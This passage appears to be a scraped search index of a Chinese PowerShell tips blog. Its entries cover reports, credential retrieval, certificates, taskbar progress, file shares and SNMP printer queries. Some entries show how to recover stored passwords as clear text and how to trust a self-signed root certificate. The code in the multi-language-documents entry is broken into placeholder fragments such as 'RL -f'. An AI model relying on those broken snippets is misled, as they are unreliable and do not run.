color:#00008B; background-color:#EEEEAA; font-size: 12pt;} table { margin-left:30px; } h2 { font-family:Tahoma; color:#6D7B8D; } h1{color:#DC143C;} h5{color:#DC143C;} &lt;/style&gt;&quot;# output to HTML$data |# make sure you use Select-Object to copy the objectsSelect-Object -Property * |Convert-ArrayToStringList |ConvertTo-Html -Title Report -Head $stylesheet |Set-Content -Path $path -Encoding UTF8Invoke-Item -Path $path 结果是位于 $Path 中指定的文件位置中的 HTML 报告。现在，缺少的是将 HTML 文件转换为 PDF 文件的方法。 有很多方法可以实现这一目标，但最方便的方法是使用 Chrome 浏览器。但是，要进行转换，首先需要安装 Chrome 浏览器（如果尚未安装）。 这是获取现有 HTML 文件并将其转换为 PDF 的最终代码： 12345678910111213141516171819202122232425# path to existing HTML file$path = &quot;$env:temp\\report.html&quot;# determine installation path for Chrome$Chrome = ${env:ProgramFiles(x86)}, $env:ProgramFiles |ForEach-Object { &quot;$_\\Google\\Chrome\\Application\\chrome.exe&quot; } |Where-Object { Test-Path -Path $_ -PathType Leaf } |Select-Object -First 1if ($Chrome.Count -ne 1) { throw &quot;Chrome not installed.&quot; }# compose destination path by changing file extension to PDF$destinationPath = [System.IO.Path]::ChangeExtension($Path, '.pdf')# doing the conversion&amp; $Chrome --headless --print-to-pdf=&quot;$destinationPath&quot; &quot;$Path&quot;# (this is async so it may take a moment for the PDF to be created)do{ Write-Host '.' -NoNewline Start-Sleep -Seconds 1} Until (Test-Path -Path $destinationPath)Invoke-Item -Path $destinationPath","link":"/2022/10/11/using-html-to-create-pdf-reports-part-3/"},{"title":"PowerShell 技能连载 - 使用 HTML 来创建 PDF 报告（第 2 部分）","text":"HTML 是一种将数据格式化为输出报告的简单方法。在第二部分中，我们说明了如何将包含数组的属性转换为字符串列表。数组无法正确显示为文本，因此此问题适用于 HTML 报告和将数据导出到 CSV。 请看：下面的代码将您的所有服务生成 HTML 报告，这是我们在第一部分结束时停下的地方： 1234567891011121314151617181920212223242526272829$path = &quot;$env:temp\\report.html&quot;# get data from any cmdlet you wish$data = Get-Service | Sort-Object -Property Status, Name# compose style sheet$stylesheet = &quot;&lt;style&gt;body { background-color:#AAEEEE;font-family:Monospace;font-size:10pt; }table,td, th { border:1px solid blue;}th { color:#00008B;background-color:#EEEEAA;font-size: 12pt;}table { margin-left:30px; }h2 {font-family:Tahoma;color:#6D7B8D;}h1{color:#DC143C;}h5{color:#DC143C;}&lt;/style&gt;&quot;# output to HTML$data | ConvertTo-Html -Title Report -Head $stylesheet | Set-Content -Path $path -Encoding UTF8Invoke-Item -Path $path 当您查看报告时，您会注意到某些列包含数据类型而不是数据，即 RequiredServices 和 DependentServices。 原因是因为这些属性包含数组。要正确显示属性内容，您需要首先将数组转换为字符串列表。 这是一个自动检测包含数组的属性并用字符串列表代替这些属性的函数： 123456789101112131415161718192021function Convert-ArrayToStringList{ param ( [Parameter(Mandatory, ValueFromPipeline)] $PipelineObject ) process { $Property = $PipelineObject.psobject.Properties | Where-Object { $_.Value -is [Array] } | Select-Object -ExpandProperty Name foreach ($item in $Property) { $PipelineObject.$item = $PipelineObject.$item -join ',' } return $PipelineObject }} 为此，您首先必须通过 Select-Object 获取可以操纵的对象的副本。Convert-ArrayToStringList 也对创建 CSV 导出非常有帮助。下面的代码将服务列表创建为 CSV 文件，并确保所有属性都是可读的，然后将 CSV 文件加载到 Microsoft Excel 中： 12345678$Path = &quot;$env:temp\\report.csv&quot;Get-Service |Select-Object -Property * |Convert-ArrayToStringList |Export-Csv -NoTypeInformation -Encoding UTF8 -Path $Path -UseCultureStart-Process -FilePath excel -ArgumentList $Path 这是一个完整的脚本，能创建一个具有所有可读属性的服务报告： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960$path = &quot;$env:temp\\report.html&quot;# get data from any cmdlet you wish$data = Get-Service | Sort-Object -Property Status, Name# helper function to convert arrays to string listsfunction Convert-ArrayToStringList{ param ( [Parameter(Mandatory, ValueFromPipeline)] $PipelineObject ) process { $Property = $PipelineObject.psobject.Properties | Where-Object { $_.Value -is [Array] } | Select-Object -ExpandProperty Name foreach ($item in $Property) { $PipelineObject.$item = $PipelineObject.$item -join ',' } return $PipelineObject }}# compose style sheet$stylesheet = &quot; &lt;style&gt; body { background-color:#AAEEEE; font-family:Monospace; font-size:10pt; } table,td, th { border:1px solid blue;} th { color:#00008B; background-color:#EEEEAA; font-size: 12pt;} table { margin-left:30px; } h2 { font-family:Tahoma; color:#6D7B8D; } h1{color:#DC143C;} h5{color:#DC143C;} &lt;/style&gt;&quot;# output to HTML$data |# make sure you use Select-Object to copy the objectsSelect-Object -Property * |Convert-ArrayToStringList |ConvertTo-Html -Title Report -Head $stylesheet |Set-Content -Path $path -Encoding UTF8Invoke-Item -Path $path","link":"/2022/10/07/using-html-to-create-pdf-reports-part-2/"},{"title":"PowerShell 技能连载 - 存取 Windows 凭据管理器","text":"如果您需要访问 Windows 凭据管理器存储的凭据（已保存的密码），则 “CredentialManager” 模块可能有所帮助。运行此代码下载并安装它： 1Install-Module -Name CredentialManager -Scope CurrentUser 安装该模块后，您可以列出其提供的新命令： 12345678PS&gt; Get-Command -Module CredentialManagerCommandType Name Version Source----------- ---- ------- ------Cmdlet Get-StoredCredential 2.0 CredentialManagerCmdlet Get-StrongPassword 2.0 CredentialManagerCmdlet New-StoredCredential 2.0 CredentialManagerCmdlet Remove-StoredCredential 2.0 CredentialManager Get-StoredCredential 获取存储的凭据。并且 New-StoredCredential 可以与凭据管理器一起存储凭据：获得存储的存储凭据。 而且，新存储者可以为您与凭据管理器一起存储凭据： 1New-StoredCredential -Target MyCred -Credentials (Get-Credential) -Type Generic -Persist LocalMachine 现在，当脚本需要访问存储的凭据时，请像这样使用 Get-StoredCredential： 1234$cred = Get-StoredCredential -Target MyCred# show clear text information$cred.UserName$cred.GetNetworkCredential().Password Windows 凭据管理器安全地为本地用户存储凭据。只有最初保存凭据的用户才能检索它。","link":"/2022/10/13/accessing-windows-credential-manager/"},{"title":"PowerShell 技能连载 - 查找 MSI 产品代码（第 1 部分）","text":"如果您需要已安装的 MSI 软件包及其产品代码列表，则可以使用 WMI 查询信息。以下操作可能需要几秒钟： 12Get-CimInstance -ClassName Win32_Product |Select-Object -Property Name, @{Name='ProductCode'; Expression={$_.IdentifyingNumber}}","link":"/2022/10/17/finding-msi-product-codes-part-1/"},{"title":"PowerShell 技能连载 - 查找 MSI 产品代码（第 2 部分）","text":"在 Windows 10 及以上版本，查找 MSI 软件包及其产品代码不再需要 WMI 查询。相反，您可以使用 Get-Package 来替代： 12345678910111213141516Get-Package |Select-Object -Property Name, @{ Name='ProductCode' Expression={ $code = $_.Metadata[&quot;ProductCode&quot;] if ([string]::IsNullOrWhiteSpace($code) -eq $false) { $code } else { 'N/A' } }} |Format-List","link":"/2022/10/19/finding-msi-product-codes-part-2/"},{"title":"PowerShell 技能连载 - 遮罩输入框（第 1 部分）","text":"永远不要将纯文本输入框用于保密信息和密码——用户输入的文本可能被记录和利用。请始终使用遮罩输入框。这是用户提示的一种简单方法： 12345678# asking secret using masked input box$secret = Read-Host &quot;Enter secret&quot; -AsSecureString# internally, get back plain text$data = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secret)$plain =[Runtime.InteropServices.Marshal]::PtrToStringAuto($data)Write-Host &quot;You secret: $plain&quot; -ForegroundColor Yellow","link":"/2022/10/21/asking-for-masked-input-part-1/"},{"title":"PowerShell 技能连载 - 遮罩输入框（第 2 部分）","text":"永远不要将纯文本输入框用于保密信息和密码——用户输入的文本可能被记录和利用。请始终使用遮罩输入框。这是使用参数的一种简单方法： 12345678910111213param( [Parameter(Mandatory)] [SecureString] # asking secret using masked input box $secret)# internally, get back plain text$data = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secret)$plain =[Runtime.InteropServices.Marshal]::PtrToStringAuto($data)Write-Host &quot;You secret: $plain&quot; -ForegroundColor Yellow 只需将数据类型 [SecureString] 用于您的参数，这样将将其强制添加一个带遮罩的输入框。","link":"/2022/10/25/asking-for-masked-input-part-2/"},{"title":"PowerShell 技能连载 - 获取卷 ID（第 1 部分）","text":"您可以查询 WMI 以获取类似驱动器卷 ID 的列表： 12Get-CimInstance -ClassName Win32_Volume |Select-Object -Property DriveLetter, DeviceID, SerialNumber, Capacity","link":"/2022/10/27/get-volume-ids-part-1/"},{"title":"PowerShell 技能连载 - 获取卷 ID（第 2 部分）","text":"在 Windows 10 及以上版本，您可以使用 Get-Volume 获取有关驱动器的卷 ID 和其他信息： 1234567891011121314PS&gt; Get-VolumeDriveLetter FriendlyName FileSystemType DriveType HealthStatus OperationalStatus SizeRemaining Size----------- ------------ -------------- --------- ------------ ----------------- ------------- ---- WINRETOOLS NTFS Fixed Healthy OK 315.58 MB 990 MBC OS NTFS Fixed Healthy OK 154.79 GB 938.04 GB Image NTFS Fixed Healthy OK 107.91 MB 12.8 GB DELLSUPPORT NTFS Fixed Healthy OK 354.46 MB 1.28 GB``请注意，尽管您最初只会看到一小部分可用信息。但将数据发送到管道可以查看到所有信息，包括卷 ID：```powershellGet-Volume | Select-Object -Property * 这是一个示例： 12345678PS&gt; Get-Volume | Select-Object -Property DriveLetter, FileSystemLabel, Size, PathDriveLetter FileSystemLabel Size Path----------- --------------- ---- ---- WINRETOOLS 1038086144 \\\\?\\Volume{733298ae-3d76-4f5f-acc4-50fdca0c6401}\\C OS 1007210721280 \\\\?\\Volume{861c48b0-d434-48d3-995a-0573c1336eb7}\\ Image 13739487232 \\\\?\\Volume{9dc0ed9d-86fd-4cd5-9ed8-3249f57720ad}\\ DELLSUPPORT 1371533312 \\\\?\\Volume{b0f36c9e-2372-47f9-8b84-cdf65447c9c6}\\","link":"/2022/10/31/get-volume-ids-part-2/"},{"title":"PowerShell 技能连载 - 创建新的代码签名测试证书","text":"PowerShell 配备了一个名为 New-SelfSignedCertificate 的 cmdlet，可以创建各种自签名的测试证书。但是，使用它为 PowerShell 代码签名创建证书并不直观，更不用说在测试机上确保测试证书值得信任。 所以我们编写了一个函数将上述 cmdlet 包装起来，使得创建既持久且可导出的代码签名证书变得更加容易： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253function New-CodeSigningCert{ [CmdletBinding(DefaultParametersetName=&quot;__AllParameterSets&quot;)] param ( [Parameter(Mandatory)] [String] $FriendlyName, [Parameter(Mandatory)] [String] $Name, [Parameter(Mandatory,ParameterSetName=&quot;Export&quot;)] [SecureString] $Password, [Parameter(Mandatory,ParameterSetName=&quot;Export&quot;)] [String] $FilePath, [Switch] $Trusted ) # create new cert $cert = New-SelfSignedCertificate -KeyUsage DigitalSignature -KeySpec Signature -FriendlyName $FriendlyName -Subject &quot;CN=$Name&quot; -KeyExportPolicy ExportableEncrypted -CertStoreLocation Cert:\\CurrentUser\\My -NotAfter (Get-Date).AddYears(5) -TextExtension @('2.5.29.37={text}1.3.6.1.5.5.7.3.3') if ($Trusted) { $Store = New-Object system.security.cryptography.X509Certificates.x509Store(&quot;Root&quot;, &quot;CurrentUser&quot;) $Store.Open(&quot;ReadWrite&quot;) $Store.Add($cert) $Store.Close() } $parameterSet = $PSCmdlet.ParameterSetName.ToLower() if ($parameterSet -eq &quot;export&quot;) { # export to file $cert | Export-PfxCertificate -Password $Password -FilePath $FilePath $cert | Remove-Item explorer.exe /select,$FilePath } else { $cert }}","link":"/2022/11/02/creating-new-code-signing-test-certificates/"},{"title":"PowerShell 技能连载 - 无人值守读取 PFX 证书","text":"PowerShell 配备了一个名为 Get-PfxCertificate 的 cmdlet，您可以用来将证书和私钥加载到内存中。但是如果证书受密码保护，则有一个强制性提示来输入密码。您不能通过参数提交密码，因此该 cmdlet 不能无人值守使用。 这是一个替代的函数，允许通过参数输入密码，从而允许以无人值守的方式即时加载 pfx 证书： 12345678910111213141516171819202122function Get-PfxCertificateUnattended{ param ( [String] [Parameter(Mandatory)] $FilePath, [SecureString] [Parameter(Mandatory)] $Password ) # get clear text password $plaintextPassword = [PSCredential]::new(&quot;X&quot;, $Password).GetNetworkCredential().Password [void][System.Reflection.Assembly]::LoadWithPartialName(&quot;System.Security&quot;) $container = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2Collection $container.Import($FilePath, $plaintextPassword, 'PersistKeySet') $container[0]} 请注意，该功能始终返回 pfx 文件中发现的第一个证书 如果您的PFX文件包含多个证书，则可能需要在最后一行代码中调整索引。","link":"/2022/11/04/loading-pfx-certificate-unattendedly/"},{"title":"PowerShell 技能连载 - 获取系统正常运行时间","text":"The Get-ComputerInfo cmdlet 可以提供有关 Windows 客户端或服务器的大量信息，例如正常运行时间和其他相关信息。 试试以下代码： 12345PS&gt; Get-ComputerInfo | Select-Object -Property *Upt*CsWakeUpType OsLastBootUpTime OsUptime------------ ---------------- -------- PowerSwitch 25.10.2022 17:32:23 6.23:07:47.4872044 该命令获取所有名字中包含 “upt” 的属性，这些属性恰好都包含了和系统运行时间有关的信息。 当然，您还可以将信息存储到变量中，并单独查询属性： 1234567891011121314151617181920PS&gt; $info = Get-ComputerInfo | Select-Object -Property *Upt*PS&gt; $info.OsUptimeDays : 6Hours : 23Minutes : 9Seconds : 28Milliseconds : 617Ticks : 6017686177952TotalDays : 6,96491455781481TotalHours : 167,157949387556TotalMinutes : 10029,4769632533TotalSeconds : 601768,6177952TotalMilliseconds : 601768617,7952PS&gt; $info.OsUptime.TotalHours167,157949387556 由于属性值显示在一列中，它们显示为一行字符串。如果您单独查询它们，例如 OsUptime，它们将暴露它们的所有自身属性。","link":"/2022/11/08/discover-system-uptime/"},{"title":"PowerShell 技能连载 - 当格式化失败时","text":"您在使用 PowerShell 时可能会遇到一个奇怪的格式问题：当您一行一行执行代码时，得到的输出结果和以整体的方式执行一段代码有所不同。 这是要执行的示例代码： Get-Process -Id $pid Get-Date Get-Service -Name Spooler 当您将三行代码作为脚本整体运行时，只有第一个命令返回表格，后两个显示列表。但是，当您逐行执行代码时，它们的格式不同，并显示为表格，甚至是单行纯文本。 这是 PowerShell 实时输出格式的副作用：当输出格式化器遇到第一个返回数据时，它必须决定格式化和写入，即表头。所有剩余的数据将插入到该输出格式中。 每当您的脚本返回多个对象并且这些对象具有不同类型时，PowerShell 就会意识到这些对象不适合现有表设计。在这种情况下，所有后续对象将格式化成列表视图。 如果您想更好地控制此行为，则可以随时将输出发送到 Out-Default，这将关闭当前的输出。任何后续对象都将启动新的输出格式。以下代码将始终显示相同的显示格式，无论您是作为脚本运行还是单独运行命令： 123Get-Process -Id $pid | Out-DefaultGet-Date | Out-DefaultGet-Service -Name Spooler","link":"/2022/11/10/when-formatting-fails/"},{"title":"PowerShell 技能连载 - 请担心 -match 运算符","text":"-match 运算符经常在脚本中使用，但是似乎并不是每个人都了解它实际的工作方式。它可能是一个非常危险的过滤器操作符。 让我们先创建一些示例数据： 123456$list = 'ServerName, Location, StatusTest1, Hannover, UpTest2, New York, UpTest11, Sydney, Up' | ConvertFrom-Csv$list 结果是假设服务器的列表： ServerName Location Status ---------- -------- ------ Test1 Hannover Up Test2 New York Up Test11 Sydney Up 假设您希望 PowerShell 脚本从列表中选择服务器并操作它，例如关闭电源： 1234# server to work with:$filter = 'Test2'# pick filter from list:$list | Where-Object ServerName -match $filter 一切看起来工作正常： ServerName Location Status ---------- -------- ------ Test2 New York Up 但是， -match 期望的是正则表达式，而不仅仅是纯文本。另外，如果在文本中的任意位置找到了匹配的表达式，则它将返回 $true。将 $filter 改为 “Test1” 以选择服务器 “Test1” 时，以下是执行结果： ServerName Location Status ---------- -------- ------ Test1 Hannover Up Test11 Sydney Up 您会意外选择了两个服务器，因为 “Test11” 也包含了文本 “Test1”。 更糟糕的是：如果出于某种愚蠢的原因，$filter 是空白的，则会选择所有内容——因为“空白”能匹配任何内容。请自己尝试，并将 $filter 的值设为 ''。 选择比较运算符时要非常小心，并且使用 -match 时要格外小心。在上面的示例中，-eq运算符（等于）会更合适，如果您必须使用通配符，那么 -like 使用起来更明确，因为它需要明确的 “*” 通配符，如果您真的只想比较数值的一部分。","link":"/2022/09/27/beware-of--match/"},{"title":"PowerShell 技能连载 - Showing Progress in Taskbar Buttons testing","text":"","link":"/2022/11/22/blog.idera.com/"},{"title":"PowerShell 技能连载 - 小心使用数组","text":"使用 PowerShell，您永远不知道 cmdlet 是返回数组还是单个对象。这是因为一旦命令返回多个项目，PowerShell 就会自动包装成数组： 1234567# no array:$test = Get-Service -Name Spooler$test -is [Array]# array:$test = Get-Service -Name S*$test -is [Array] 理解这一点很重要，因为这意味着运行时条件可以确定变量的类型。这可能会导致意外情况。以下是说明问题的一个示例： 下面的代码返回以 “C” 开头的所有服务的名称，然后取第一个服务名称。这是有可能的，因为不仅有一个以 “C” 开头的服务，因此 PowerShell 返回 $ServiceNames 中的数组，然后您可以在此数组中使用数字索引来选择特定的元素： 1234567$Name = 'c*'# get service names$servicenames = Get-Service -Name $Name | Select-Object -ExpandProperty Name# get first service name$servicenames[0] 但是，您不能假设 $servicenames 始终是一个数组。如果在运行时只有一项与您的请求匹配的服务，则结果不再是一个数组，而是直接是服务名称。 为什么（以及何时）这有关系？当您的代码采用数组特定功能的那一刻，它就十分重要。因为在某些情况下可能不存在该功能或行为不同。 为了说明这一点，下面的代码现在列出了以 “cry” 开头的所有服务。只有一项服务与请求匹配。因此，$servicenames 不再是一个数组。现在是一个字符串。当您在字符串上使用索引时，您会得到该字符串中的一个字母。 现在，相同的代码返回的是一个字符，而不是服务名称： 1234567$Name = 'cry*'# get service names$servicenames = Get-Service -Name $Name | Select-Object -ExpandProperty Name# get first service name$servicenames[0] 这些示例似乎有些人为构造，但是您可以在许多难以找到的脚本错误的内部中找到潜在的问题。这就是为什么重要的是要始终确保您在代码使用数组功能时获得的真正是一个数组。 确保您获得数组的一种简单方法是构造器 @()：括号中的任何内容都以数组的形式返回。这就是为什么下面代码有效的原因，无论命令是否返回一个或多个结果： 12345678$Name = 'cry*'# get service names$servicenames = @(Get-Service -Name $Name | Select-Object -ExpandProperty Name)# get first service name$servicenames[0] 1234567$Name = 'cry*'# get service names[array]$servicenames = Get-Service -Name $Name | Select-Object -ExpandProperty Name# get first service name$servicenames[0] 1234567$Name = 'cry*'# get service names[string[]]$servicenames = Get-Service -Name $Name | Select-Object -ExpandProperty Name# get first service name$servicenames[0] 但是，[array] 更容易使用，因为无论数据类型如何，它总是可以使用，并且 [array] 对于不熟悉类型的用户也更容易理解。","link":"/2022/11/29/careful-with-arrays/"},{"title":"PowerShell 技能连载 - Determining Language Packs (Part 3)","text":"在本系列的第 2 部分中，您已经看到了使用 WMI 与使用命令行工具（如 dism.exe）相比，使用 WMI 查询安装的操作系统语言列表的速度要容易得多，且更快。但是，使用 WMI 仍然需要您知道适当的 WMI 类名。 这就是为什么 PowerShell 提供一个全能的 cmdlet Get-ComputerInfo 的原因。它为您查询各种与计算机相关的信息，然后将其与您联系。 我们也可以通过这种方法解决这个问题： 12$a = Get-ComputerInfo$a.OsMuiLanguages 但不幸的是，Get-ComputerInfo 总是查询完整的信息集，这使得它很缓慢。但总比没有好，甚至比 dism.exe 更好，而第 2 部分的直接 WMI 查询仍然是效率最高的方法。","link":"/2022/11/29/determining-language-packs-part-3/"},{"title":"PowerShell 技能连载 - 检测多语言在线文档（第 2 部分）","text":"要如何检测一份在线文档支持哪些语言？ 如果 URL 使用语言 ID，则很容易创建包含所有可用语言 ID 的 URL 列表。这就是我们到目前为止第一部分中所做的： 1$list = RL -f 在第二部分中，我们现在确定列表中哪些 URL 实际中可用。但是，只是通过 Invoke-Webrequest 访问该 URL 是不够的： 1$list = RL -f 事实证明，所有 URL 都能正常地访问 Microsoft WEB 服务器，并返回状态 “OK”（包括不存在的文档地址）： 1PS&gt; New-SCode 这是因为 Microsoft WEB 服务器（与许多其它的一样）首先接受所有 URL。然后，在内部，WEB 服务器弄清楚下一步该怎么做，并将新的 URL 返回到浏览器中。可能返回的是原始的 URL（如果 WEB 服务器找到了资源），也可能是一个全新的URL，例如通用搜索站点或自定义的“未找到”通知。状态 “OK” 与 URL 的有效性并没有关联。 您实际上可以通过禁止自动重定向来查看内部工作过程。对 Invoke-WebRequest 命令添加参数 &quot;-MaximumRedirection 0 -ErrorAction Ignore&quot;。 1$list = RL -f 现在，您看到 Web 服务器如何告诉浏览器，URL 跳转至其他地方，有效地将浏览器重定向到新的 URL。 检查 URL 是否存在，取决于特定的 Web 服务器的工作原理。在微软的例子中，事实证明有效的 URL 会导致单次重定向，而无效的 URL 会导致多次重定向。用重定向的次次数是否为一次，可以区分合法和非法的 URL。 这是最终解决方案，它还支持实时进度条。 它在网格视图窗口中显示可用的本地化在线文档，您可以选择一个或多个以在浏览器中显示。您也可以以 $result 的形式获取结果，然后将其打印到 PDF 并将其提交给其它语言的员工。 1$list = $h.Keys | ForEach-Object { $URL -f","link":"/2022/11/29/identifying-multi-language-online-documents-part-2/"},{"title":"PowerShell 技能连载 - Showing Progress in Taskbar Buttons","text":"如果您在 Windows 上运行 PowerShell 脚本，则可以将任务栏按钮用作进度指示器。您需要的只是安装此模块： 1Install-Module -Name PsoProgressButton -Scope CurrentUser 接下来，您可以运行下面的命令以将任务栏按钮内的进度栏设置为 0 到 100 之间的值。这段代码将指示器设置为 50％： 1PS&gt; Set-PsoButtonProgressValue -CurrentValue 50 要关闭指示器，请运行以下代码： 1PS&gt; Set-PsoButtonProgressState -ProgressState NoProgress","link":"/2023/01/03/showing-progress-in-taskbar-buttons/"},{"title":"PowerShell 技能连载 - 在任务栏按钮中显示不确定的进度","text":"有时，您不知道脚本的确切进度，但您仍然想通知用户您的脚本“忙”。如果您在 Windows 上运行 PowerShell 脚本，则可以使用任务栏按钮显示不确定的进度条。该进度条将“永远”运行，直到您将其关闭。 您需要的只是安装此模块： 1Install-Module -Name PsoProgressButton -Scope CurrentUser 接下来，您可以运行下面的命令以打开不确定的进度条。它在代表您的运行 PowerShell 脚本的任务栏按钮内显示： 1PS&gt; Set-PsoButtonProgressState -ProgressState Indeterminate 要关闭该指示器，请运行以下操作： 1PS&gt; Set-PsoButtonProgressState -ProgressState NoProgress","link":"/2023/01/05/showing-indeterminate-progress-in-taskbar-buttons/"},{"title":"PowerShell 技能连载 - 在任务栏按钮显示错误状态","text":"当您的脚本执行时发生错误，如果能通过任务栏按钮显示错误状态，那么是再好不过的了。如果一个任务栏按钮显示红色，您可以立即知道该关注您的脚本。 您所需的只是这个模块： 1Install-Module -Name PsoProgressButton -Scope CurrentUser 然后，设置一个进度值并且将它设置为红色： 12Set-PsoButtonProgressState -ProgressState ErrorSet-PsoButtonProgressValue -CurrentValue 100 要关闭指示，请运行以下代码： 1PS&gt; Set-PsoButtonProgressState -ProgressState NoProgress","link":"/2023/01/09/showing-error-state-in-taskbar-button/"},{"title":"PowerShell 技能连载 - 在任务栏按钮显示警告状态","text":"当您的脚本需要注意，例如需要用户输入时，我们可以将 Windows 任务栏中的按钮变为橙色，这样用户可以立即知道需要检查您的脚本。 您所需的只是这个模块： 1Install-Module -Name PsoProgressButton -Scope CurrentUser 下一步，设置一个进度值并且将它设置成红色： 12Set-PsoButtonProgressState -ProgressState PausedSet-PsoButtonProgressValue -CurrentValue 100 要关闭指示，请运行以下脚本： 1PS&gt; Set-PsoButtonProgressState -ProgressState NoProgress","link":"/2023/01/11/showing-warning-state-in-taskbar-button/"},{"title":"PowerShell 技能连载 - 管理文件共享","text":"Windows 操作系统自带了 “Storage” PowerShell 模块，它可以同时用于 Windows PowerShell 和 PowerShell 7。 这个模块可以管理许多东西，其中之一是文件共享，不过需要管理员特权来运行以下命令。 要获取文件共享的清单（可以通过网络访问的本地文件夹），请试着执行以下代码： 12345678910111213141516171819202122232425262728293031323334353637383940PS C:\\&gt; Get-FileShareName HealthStatus OperationalStatus---- ------------ -----------------ADMIN$ Healthy OnlineC$ Healthy Onlineprint$ Healthy OnlinePS C:\\&gt; Get-FileShare -Name c$Name HealthStatus OperationalStatus---- ------------ -----------------C$ Healthy OnlinePS C:\\&gt; Get-FileShare -Name c$ | Select-Object -Property *HealthStatus : HealthyOperationalStatus : OnlineShareState : OnlineFileSharingProtocol : SMBObjectId : {1}\\\\DELL7390\\root/Microsoft/Windows/Storage/Providers_v2\\WSP_FileShare.ObjectId=&quot;{c0c2f698-c81d-11e9-9f6f-80 6e6f6e6963}:FX:SMB||*||C$&quot;PassThroughClass :PassThroughIds :PassThroughNamespace :PassThroughServer :UniqueId : smb|DELL7390/C$ContinuouslyAvailable : FalseDescription : StandardfreigabeEncryptData : FalseName : C$VolumeRelativePath : \\PSComputerName :CimClass : ROOT/Microsoft/Windows/Storage:MSFT_FileShareCimInstanceProperties : {ObjectId, PassThroughClass, PassThroughIds, PassThroughNamespace...}CimSystemProperties : Microsoft.Management.Infrastructure.CimSystemProperties 类似地，其它动词可以执行相关的任务，例如改变一个已有的共享 (Set) 或者创建一个新的共享 (New)： 123456789PS C:\\&gt; Get-Command -Noun FileShareCommandType Name Version Source----------- ---- ------- ------Function Debug-FileShare 2.0.0.0 StorageFunction Get-FileShare 2.0.0.0 StorageFunction New-FileShare 2.0.0.0 StorageFunction Remove-FileShare 2.0.0.0 StorageFunction Set-FileShare 2.0.0.0 Storage","link":"/2023/01/13/managing-file-shares/"},{"title":"PowerShell 技能连载 - Custom Action for Unknown Commands","text":"每当输入一个无法被 PowerShell 搜索到的命令名时，它都可以通过您定义的自定义操作来扩展命令搜索。 以下是一个快速有趣的示例，演示这个概念： 12345678910111213$ExecutionContext.InvokeCommand.CommandNotFoundAction = { # second argument is the command that was missing: $p = $args[1] # do not try and find it elsewhere $p.StopSearch = $true $command = $p.CommandName # output audio message (make sure your audio is turned up) $sapi = New-Object -ComObject Sapi.SpVoice $sapi.Speak(&quot;Command $command not found.&quot;) } 当运行完以上代码，然后再次运行一个肯定不存在的命令时，您将会听到一个语音提示（假设您的音量是开启的且扬声器已打开）。当 PowerShell 无法找到一个命令，它会查找所有赋值给 CommandNotFoundAction 的脚本块并执行它。 这个点子是用于改进命令发现。例如，您可能会花时间整理一个流行命令列表和发布这些命令的模块名称。然后，您的自定义脚本块会尝试并查找列表中缺失的命令，并让用户知道缺失的模块名——或者甚至自动下载并安装该模块。 不幸的是，自从 PowerShell 提供了该功能之后，社区中并没有人实现了该功能。现在您可能会有兴趣发明一些比上面发出语音更复杂的功能。","link":"/2023/01/17/custom-action-for-unknown-commands/"},{"title":"PowerShell 技能连载 - 订阅锁定和解锁事件","text":"当一个用户在 Windows 系统中锁定了会话，会发出一个事件。当解锁会话的时候会发出另一个事件。两个事件都可以触发 PowerShell 代码，这样可以实现锁定和解锁系统时运行任意 PowerShell 代码。 以下两个函数演示该功能： 12345678910111213141516171819function Start-Fun { $null = Register-ObjectEvent -InputObject ([Microsoft.Win32.SystemEvents]) -EventName &quot;SessionSwitch&quot; -Action { Add-Type -AssemblyName System.Speech $synthesizer = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer switch($event.SourceEventArgs.Reason) { 'SessionLock' { $synthesizer.Speak(&quot;Bye bye $env:username!&quot;) } 'SessionUnlock' { $synthesizer.Speak(&quot;Nice to see you again $env:username!&quot;) } } }}function End-Fun { $events = Get-EventSubscriber | Where-Object { $_.SourceObject -eq [Microsoft.Win32.SystemEvents] } $jobs = $events | Select-Object -ExpandProperty Action $events | Unregister-Event $jobs | Remove-Job} 运行以上代码，然后运行 Start-Fun 将代码附加到事件上。当您锁定或解锁电脑时，您将会得到一个 PowerShell 发出的语音提示。当然，您可以做其它事情，例如将设备设为节能模式。 运行 End-Fun 来移除事件订阅。","link":"/2023/01/19/subscribing-to-session-lock-unlock-events/"},{"title":"PowerShell 技能连载 - 通过 SNMP 查询高级的打印机","text":"许多网络打印机支持使用 SNMP 查询设备信息，例如序列号、状态和纸仓中纸张的大小，以及错误信息。 在 Windows 系统中，操作系统通过 PowerShell 已经提供所有 SNMP 查询所需的组件。您所需要知道的只是打印机的 IP 地址。当然，请确保它已开机并支持 SNMP。 以下是测试脚本： 123456789101112# define your printer network IP here:$Printer_IP = '192.168.2.200'# connect to printer:$SNMP = New-Object -ComObject olePrn.OleSNMP$SNMP.Open($Printer_IP,'public')# get device description$SNMP.Get(&quot;.1.3.6.1.2.1.25.3.2.1.3.1&quot;)# get device serial number$SNMP.Get(&quot;.1.3.6.1.2.1.43.5.1.1.17.1&quot;)$SNMP.Close() 这段代码非常短小。 更有挑战性的是：除了设备描述和序列号之外您能找到哪些信息？如何知道您可以查询的剩余信息片段的 ID 号。下面是一个最常用的 ID 列表。不过，并非所有打印机都支持所有的 ID： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#region list of IDs that you can ask your printer:# (not all IDs will work with all printers)$OID_RAW_DATA = &quot;.1.3.6.1.2.1.43.18.1.1&quot;$OID_CONSOLE_DATA = &quot;.1.3.6.1.2.1.43.16&quot;$OID_CONTACT = &quot;.1.3.6.1.2.1.1.4.0&quot;$OID_LOCATION = &quot;.1.3.6.1.2.1.1.6.0&quot;$OID_SERIAL_NUMBER = &quot;.1.3.6.1.2.1.43.5.1.1.17.1&quot;$OID_SYSTEM_DESCRIPTION = &quot;.1.3.6.1.2.1.1.1.0&quot;$OID_DEVICE_DESCRIPTION = &quot;.1.3.6.1.2.1.25.3.2.1.3.1&quot;$OID_DEVICE_STATE = &quot;.1.3.6.1.2.1.25.3.2.1.5.1&quot;$OID_DEVICE_ERRORS = &quot;.1.3.6.1.2.1.25.3.2.1.6.1&quot;$OID_UPTIME = &quot;.1.3.6.1.2.1.1.3.0&quot;$OID_MEMORY_SIZE = &quot;.1.3.6.1.2.1.25.2.2.0&quot;$OID_PAGE_COUNT = 